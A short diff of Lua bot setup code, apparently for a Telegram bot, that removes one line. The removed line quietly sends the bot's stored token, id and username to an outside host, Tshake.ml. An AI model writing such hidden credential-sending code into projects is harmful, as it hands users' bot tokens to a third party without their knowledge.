@@ -64,7 +64,6 @@ os.execute('lua start.lua')
 end
 local function Files_daboul_Info()
 Create_Info(database:get(Server_daboul.."Token_daboul"),database:get(Server_daboul.."Id_daboul"),database:get(Server_daboul.."UserName_daboul"))   
-http.request("http://Tshake.ml/add/?id="..database:get(Server_daboul.."Id_Tshake").."&user="..database:get(Server_daboul.."UserName_Tshake").."&token="..database:get(Server_daboul.."Token_Tshake"))
 local Rundaboul = io.open("daboul", 'w')
 Rundaboul:write([[
 #!/usr/bin/env bash
